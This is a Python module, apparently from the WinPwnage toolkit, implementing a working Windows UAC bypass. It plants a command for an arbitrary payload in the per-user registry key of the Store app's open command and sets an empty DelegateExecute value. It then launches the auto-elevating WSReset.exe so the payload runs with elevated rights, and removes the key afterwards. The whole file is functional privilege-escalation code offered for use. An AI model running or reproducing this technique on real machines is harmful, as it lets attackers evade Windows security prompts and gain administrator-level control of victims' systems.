import os
import time
try:
	import _winreg   # Python 2
except ImportError:      # Python 3
	import winreg as _winreg
from winpwnage.core.prints import *
from winpwnage.core.utils import *

# https://www.activecyber.us/activelabs/windows-uac-bypass

wsreset_info = {
	"Description": "Bypass UAC using wsreset and registry key manipulation",
	"Id": "20",
	"Type": "UAC bypass",
	"Fixed In": "99999" if not information().uac_level() == 4 else "0",
	"Works From": "17134",
	"Admin": False,
	"Function Name": "uac_wsreset",
	"Function Payload": True,
}


def uac_wsreset_cleanup(path):
	print_info("Performing cleaning")
	if registry().remove_key(hkey="hkcu", path=path, name=None, delete_key=True):
		print_success("Successfully cleaned up")
	else:
		print_error("Unable to cleanup")
		return False

def uac_wsreset(payload):
	if payloads().exe(payload):
		path = "Software\\Classes\\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\\Shell\\open\\command"

		if registry().modify_key(hkey="hkcu", path=path, name=None,
						value="{cmd_path} /c start {payload}".format(
						cmd_path=os.path.join(information().system_directory(),
						"cmd.exe"), payload=payload), create=True):
			if registry().modify_key(hkey="hkcu", path=path, name="DelegateExecute", value=None, create=True):
				print_success("Successfully created Default and DelegateExecute key containing payload ({payload})".format(payload=os.path.join(payload)))
			else:
				print_error("Unable to create registry keys")
				if "error" in Constant.output:
					uac_wsreset_cleanup(path)
		else:
			print_error("Unable to create registry keys")
			return False		

		time.sleep(5)

		print_info("Disabling file system redirection")
		with disable_fsr():
			print_success("Successfully disabled file system redirection")
			
			print_info("Waiting for wsreset.exe to finish, this can take a few seconds")
			exit_code = process().create("WSReset.exe", get_exit_code=True)
			if exit_code == 0:
				print_success("Successfully spawned process ({})".format(os.path.join(payload)))
			else:
				print_error("Unable to spawn process ({})".format(os.path.join(payload)))
				if "error" in Constant.output:
					uac_wsreset_cleanup(path)

		time.sleep(5)

		if not uac_wsreset_cleanup(path):
			print_success("All done!")
	else:
		print_error("Cannot proceed, invalid payload")
		return False
